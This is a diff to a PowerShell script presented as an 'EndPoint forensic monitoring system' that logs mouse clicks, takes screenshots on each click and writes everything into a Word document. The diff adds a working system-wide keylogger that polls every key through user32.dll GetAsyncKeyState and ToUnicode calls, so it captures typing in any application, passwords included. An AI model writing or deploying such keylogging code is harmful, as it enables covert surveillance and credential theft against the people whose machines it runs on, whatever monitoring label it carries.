@@ -1,7 +1,9 @@
-﻿#########################
-#Import Modules
-#########################
-Import-Module $home\Desktop\powershell-modules\AddImagesToWordDocument.psm1
+﻿<#
+Author: Lukeman Hakkim Sheik Alavudeen
+
+Title: EndPoint forensic monitoring system
+#>
+
 
 $Time = Read-Host "Enter the time(in Seconds) to monitor the system"
 
@@ -37,24 +39,71 @@ function take_screenshots ($File)
     Write-Output $File
 }
 
-$pos_str = "`n"
-$keystr=""
 
-#step1
+
+#requires -Version 2 
+function Start-KeyLogger() 
+{
+  # Signatures for API Calls
+  $signatures = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@ 
+ 
+  # load signatures and make members available
+  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+ 
+      Start-Sleep -Milliseconds 40
+      
+      # scan all ASCII codes above 8
+      for ($ascii = 9; $ascii -le 254; $ascii++) {
+        # get current key state
+        $state = $API::GetAsyncKeyState($ascii)
+ 
+        # is key pressed?
+        if ($state -eq -32767) {
+          $null = [console]::CapsLock
+ 
+          # translate scan code to real code
+          $virtualKey = $API::MapVirtualKey($ascii, 3)
+ 
+          # get keyboard state for virtual keys
+          $kbstate = New-Object Byte[] 256
+          $checkkbstate = $API::GetKeyboardState($kbstate)
+ 
+          # prepare a StringBuilder to receive input key
+          $mychar = New-Object -TypeName System.Text.StringBuilder
+
+ 
+          # translate virtual key
+          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+
+          if($mychar){
+          return $mychar.ToString()}
+ 
+      }
+    }
+   }
+ 
+
+##############################################
+#1.To Monitor the mouse clicks
+#2.To take screenshots on mouse click
+#3.To monitor the keystrokes
+##############################################
+
 $count=0
+$dict_count=1
+$master_dict=@{}
+
 do
 {
-
-     #To monitor the keystrokes
-     # wait for a key to be available:
-     if ([Console]::KeyAvailable)
-     {
-        # read the key, and consume it so it won't
-        # be echoed to the console:
-        $keyInfo = [Console]::ReadKey($true)
-        $keychar = $keyInfo.KeyChar
-        $keystr = $keystr + $keychar
-     }
 
  $mouse_events = [System.Windows.Forms.UserControl]::MouseButtons
  if (($mouse_events -like "left") -or ($mouse_events -like "right"))
@@ -62,46 +111,96 @@ do
      
      #To monitor the mouse coordinates
      $pos = [System.Windows.Forms.Cursor]::Position
-     $pos_str = $pos_str + "The Mouse coordinates are $pos`n"
+     $pos_str = "The Mouse coordinates are $pos`n"
+
+     #count for mouse coordinates
+     $master_dict.Add($dict_count, $pos_str)
+     $dict_count+=1
+
 
      #To capture the screenshots on click 
      echo "captured" 
-     Start-Sleep -Seconds 1
+     #Start-Sleep -Seconds 1
      $count +=1
      $File = "$home\Desktop\screenshots\MyScreenshot" + $count + ".bmp"
      take_screenshots ($File)
-     continue
+
+     #count for screenshots
+     $master_dict.Add($dict_count, "Myscreenshot"+$count)
+     $dict_count+=1
      
  }
+
+ # records all key presses
+ $key_pressed = Start-KeyLogger
+
+ #count for keypressed
+ $master_dict.Add($dict_count, $key_pressed)
+ $dict_count+=1
+
 
 }until ($stopWatch.Elapsed -ge $timeSpan)
 
 
-#To write the
-Add-OSCPicture -WordDocumentPath "$home\Desktop\Images.docx" -ImageFolderPath "$home\Desktop\screenshots"
 
-
-$Result_str = $pos_str + "`n Keystrokes Used during the session: `n " + $keystr
-$Result_str
-
-function append_data_to_word($savepath)
-{
-    $wdStory = 6 
-    $wdMove = 0
-    $objWord = New-object -comobject Word.Application  
-    $objWord.Visible = $True 
-    $objDoc = $objWord.Documents.Open($savepath) 
-    $objSelection = $objWord.Selection 
-    $a = $objSelection.EndKey($wdStory, $wdMove) 
-    $objSelection.TypeParagraph() 
-    $objSelection.TypeParagraph() 
-    $text = "This text was appended to an existing Word document." 
-    $objSelection.TypeText($result_str) 
-    $objdoc.SaveAs([ref]$savepath) 
-    $objdoc.Close() 
-    $objword.quit() 
-} 
-
+########################################
+#File Handling
+########################################
 $savepath = "$home/Desktop/Images.docx"
-append_data_to_word($savepath)
+$wdStory = 6 
+$wdMove = 0
+$objWord = New-object -comobject Word.Application  
+$objWord.Visible = $True 
+$objDoc = $objWord.Documents.Open($savepath) 
+$objSelection = $objWord.Selection 
+$a = $objSelection.EndKey($wdStory, $wdMove) 
+$objSelection.TypeParagraph() 
+$objSelection.TypeParagraph() 
+
+
+
+###############################################
+#To  write data in a sequential Manner 
+###############################################
+for ($i = 1; $i -lt $master_dict.Count+1; $i++)
+
+    {
+    
+    $key = $i
+    $value=$master_dict[$i]
+
+    #Write-Host ("Key = " + $key + " and Value = " + $value);
+
+    if ($value -like "")
+    {
+    continue
+    }
+
+    else
+
+    {
+        if ((($value).Contains("Myscreenshot")) -eq "True")
+        {
+        #To write the image file
+        $objSelection.TypeParagraph()
+        $objShape = $objSelection.InlineShapes.AddPicture("$home\Desktop\screenshots\$value"+".bmp")
+        $objSelection.TypeParagraph()
+        Start-Sleep -Seconds 1
+        continue
+        }
+        else
+        {
+         $objSelection.TypeText($value)
+         #$objSelection.TypeParagraph()
+        }
+    }
+}   
+
+$objdoc.SaveAs([ref]$savepath) 
+$objdoc.Close() 
+$objword.quit() 
+
+
+
+
 
